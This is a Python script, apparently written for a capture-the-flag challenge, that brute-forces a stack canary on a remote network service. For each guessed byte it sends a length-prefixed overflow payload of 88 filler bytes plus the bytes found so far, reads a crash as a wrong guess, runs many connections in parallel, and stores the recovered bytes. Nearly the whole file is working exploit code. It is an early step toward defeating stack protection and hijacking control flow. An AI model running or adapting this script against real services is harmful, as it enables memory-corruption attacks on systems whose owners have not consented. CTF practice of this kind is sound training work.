#!/usr/bin/env python3
import socket,time,struct,select,sys,os,threading
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
HOST='0.cloud.chals.io'; PORT=27813
try: HOST=socket.gethostbyname(HOST)
except Exception: pass
BUF=88
OUT='canary.txt'
MARK=b'floe> '

def recv_until(s, marker=MARK, timeout=2.0):
    data=b''; end=time.time()+timeout
    while time.time()<end:
        r,_,_=select.select([s],[],[],max(0,end-time.time()))
        if not r: break
        try: c=s.recv(65536)
        except Exception: break
        if not c: break
        data+=c
        if marker in data: break
    return data

def one(payload, banner_timeout=3.0, resp_timeout=1.5):
    try:
        s=socket.create_connection((HOST,PORT),timeout=5)
        s.settimeout(2)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        b=recv_until(s,timeout=banner_timeout)
        if MARK not in b:
            s.close(); return 'NOBANNER'
        s.sendall(struct.pack('>H',len(payload))+payload)
        o=recv_until(s,timeout=resp_timeout)
        s.close()
        return 'OK' if MARK in o else 'CRASH'
    except Exception:
        return 'ERR'

known=b''
if os.path.exists(OUT):
    t=open(OUT).read().strip()
    if t:
        try: known=bytes.fromhex(t)
        except Exception: known=b''
if not known: known=b'\x00'
print('start known',known.hex(),flush=True)

while len(known)<8:
    pos=len(known)
    cands=list(range(256))
    found=None
    workers=24
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs={}
        for c in cands:
            p=b'A'*BUF+known+bytes([c])
            futs[ex.submit(one,p)]=c
        pending=set(futs)
        while pending and found is None:
            done,_=wait(pending, timeout=2.0, return_when=FIRST_COMPLETED)
            if not done:
                print(f'pos {pos}: waiting, {len(pending)} pending',flush=True)
                continue
            for f in done:
                pending.discard(f)
                c=futs[f]
                try: r=f.result()
                except Exception: r='ERR'
                if r=='OK':
                    found=c
                    for g in pending: g.cancel()
                    break
    if found is None:
        # second slower pass, sequential
        print(f'pos {pos}: no hit first pass, sequential rescan',flush=True)
        for c in cands:
            p=b'A'*BUF+known+bytes([c])
            for _ in range(3):
                if one(p,banner_timeout=5,resp_timeout=3)=='OK':
                    found=c; break
            if found is not None: break
    if found is None:
        print(f'FAILED at {pos}',flush=True); sys.exit(1)
    # verify
    ver=[one(b'A'*BUF+known+bytes([found]),banner_timeout=5,resp_timeout=3) for _ in range(5)]
    print(f'byte {pos} = {found:02x} verify={ver}',flush=True)
    if ver.count('OK') < 3:
        print(f'verification failed for {found:02x}; aborting for manual check',flush=True)
        sys.exit(2)
    known+=bytes([found])
    open(OUT,'w').write(known.hex())
    print('ACCEPT',known.hex(),flush=True)

print('CANARY',known.hex(),flush=True)
print('final verify:',[one(b'A'*BUF+known,banner_timeout=5,resp_timeout=3) for _ in range(5)],flush=True)
